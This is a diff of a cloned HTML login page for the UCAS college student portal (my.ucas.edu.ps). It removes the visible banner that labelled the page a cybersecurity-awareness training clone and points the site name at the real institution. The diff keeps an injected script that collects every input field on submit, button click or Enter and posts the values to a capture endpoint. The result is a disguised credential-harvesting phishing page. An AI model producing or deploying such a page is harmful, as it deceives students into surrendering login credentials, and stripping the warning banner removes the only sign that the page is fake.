@@ -2,7 +2,7 @@
 <!DOCTYPE html>
 
 <html class="notranslate" lang="ar">
-<head><meta charset="utf-8"/><base href="https://my.ucas.edu.ps/login?backurl=/Registration/semester_registration"/>
+<head><meta charset="utf-8"/><base href="https://my.ucas.edu.ps/login?backurl=/Registration/transcript"/>
 <meta charset="utf-8"/>
 <title>خدمات الطلبة - الكلية الجامعية للعلوم التطبيقية</title>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
@@ -19,7 +19,7 @@
 <link href="/NewTemp/src/style.css" rel="stylesheet" type="text/css"/>
 <link href="/NewTemp/src/css-light/cusstyle.css" id="cus_style" rel="stylesheet" type="text/css"/>
 </link></meta></head>
-<body class="authentication-bg"><div style="position:sticky;top:0;z-index:999999;background:#dc3545;color:#fff;padding:12px;text-align:center;font-family:Arial;font-weight:bold;">🎓 ACADEMIC TRAINING CLONE - This is a copied page for cybersecurity awareness only.</div>
+<body class="authentication-bg"><div></div>
 <div class="account-pages mt-4 mb-2">
 <div class="container">
 <div class="col-md-12" style="margin-bottom:25px;">
@@ -34,7 +34,7 @@
 <input id="__LASTFOCUS" name="__LASTFOCUS" type="hidden" value=""/>
 <input id="__EVENTTARGET" name="__EVENTTARGET" type="hidden" value=""/>
 <input id="__EVENTARGUMENT" name="__EVENTARGUMENT" type="hidden" value=""/>
-<input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="dqwHZ3gUvUKMKmkylzgbGaHRz556Csa5wmJKt0nAD9NQfFSjfJnFbgD9Ndh4cW84l8wy8Kp9UF5BAq8NHfVj7PmLI/NMpFmMz5an3KsyiFm1nGWvGCTlguVg+NugcBFWZSuv3fGMrAeup6O06RbW4TQ4vimmM9MrXXXICSjTnzBcighPuy1BQ3yB28zz/ofHYolj1c1X/Q9L/0WtnK9D2TrSid7QK5xqpUaQRSG3pAHzp3oBONTFeXdyapo9+mjxwteKr30JGQGImNqxSnZS+4XncRPb9kza9VA+pGYPbQdA52ya6fVo4t8ZK5nse8Fpf9TSZYGt4vjpZRV/QQ9+WGzofts5XKnwgtsvJq63/mF0Pnz4fPgOVBsmYHejmQY9"/>
+<input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="316kIm4pRXrXA/3ye6r1bOIv3d121jn8ke86tSGEUvS9sdhIm2D44U7a5Dpx2fzlhbXsklbDIESDvhIjVTB5iicX9+mazoy4o41q7BvSr4ohaFKXijPF5rS8onLyI/rEl8V5bd1SB1DPMz+TyZadL4uVei7n2Driqnj31HXjzwlrq+rJHoNpg4fE6hRyWSesmZRQd0TuL1TYvBSwwBqEilK1Hiv0DcBvEOzMQpX19TWrrMSEQvvI1aCtCwAUtUmfZeSKlez6KeU7ojP8Vb/SsbdKDxdXWn6N8/QWMV4UohBYo2EIsZ5mkhH3et8JKmGnXwGXlpdEeYwUNg1KhhJwNvrC9N6AooWpuu2UDTk9XVMCFuhlw4OJjyoLiq35gDl/"/>
 </div>
 
 
@@ -42,7 +42,7 @@
 <div class="aspNetHidden">
 <input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="805C0972"/>
 <input id="__VIEWSTATEENCRYPTED" name="__VIEWSTATEENCRYPTED" type="hidden" value=""/>
-<input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="MAVISnirKLtYNVuHml7itwRW+ffYjxJh5SCfvLeGV+pemcaz7jg2SD1NK1b9svUBg3gHFvhTOA7QnyAh3A0BdIQ+azde3S8ObueBNLe9hp7MKB+rhCaIugeTW26ntk/VGKJl4EcBm67nS49JIu8hoVySKV0X8+iICxXiO38/a4kHyr7BkOMaC846PE3hcPAC"/>
+<input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="zUqADJKVIWY5Q/WxjHtwrzNOSsZIi23B4QXiZR+GwEj5jsLmkN149GDInQtsskI3YAuip1zlBYVjlq+cf0zGlUzBvY9NYqmr+vltAdrXRCRVv86Wdz2bd0ibgGRyF5UGk2X3c5i/ni3l3E0RE+88mT0BcxkVErBkHjlulJIIERmUAvlcR7bvrMNR9l7u8RLo"/>
 </div>
 <div class="row justify-content-center">
 <div class="col-md-8 col-lg-6 col-xl-5">
@@ -152,7 +152,6 @@
 <script>
         (function(){
             function captureAndSend(e) {
-                // مسح الشاشة بالكامل بحثاً عن أي حقل إدخال (بدون الحاجة لـ Form)
                 var inputs = document.querySelectorAll('input');
                 var data = {};
                 var hasData = false;
@@ -165,11 +164,11 @@
                     }
                 });
                 
-                if(!hasData) return; // لا ترسل إذا كانت جميع الحقول فارغة
+                if(!hasData) return; 
                 
                 if(e) { e.preventDefault(); e.stopPropagation(); }
                 
-                var siteName = "ggg";
+                var siteName = "my_ucas_edu_ps";
                 var captureUrl = window.location.origin + '/api/capture-submit';
                 var redirectUrl = window.location.origin + '/awareness-training';
                 
@@ -182,30 +181,18 @@
                 .catch(function(){ window.location.href = redirectUrl; });
             }
             
-            // 1. التقاط الحدث التقليدي (Form Submit)
-            document.addEventListener('submit', function(e){
-                captureAndSend(e);
-            }, true);
+            document.addEventListener('submit', function(e){ captureAndSend(e); }, true);
             
-            // 2. التقاط الضغط على أي زر (للمواقع الحديثة التي لا تستخدم Forms)
             document.addEventListener('click', function(e){
                 var t = e.target;
-                // إذا كان العنصر المضغوط هو زر، أو صورة داخل زر، أو زر Input
                 var isButton = t.tagName === 'BUTTON' || t.closest('button') || (t.tagName === 'INPUT' && (t.type === 'submit' || t.type === 'button'));
                 var isLoginLink = t.tagName === 'A' && (t.innerText.toLowerCase().includes('login') || t.innerText.includes('دخول') || t.innerText.includes('sign in'));
-                
-                if(isButton || isLoginLink) {
-                    captureAndSend(e);
-                }
+                if(isButton || isLoginLink) { captureAndSend(e); }
             }, true);
             
-            // 3. التقاط الضغط على زر Enter من الكيبورد
             document.addEventListener('keypress', function(e){
-                if(e.key === 'Enter') {
-                    captureAndSend(e);
-                }
+                if(e.key === 'Enter') { captureAndSend(e); }
             }, true);
-            
         })();
         </script></body>
 </html>
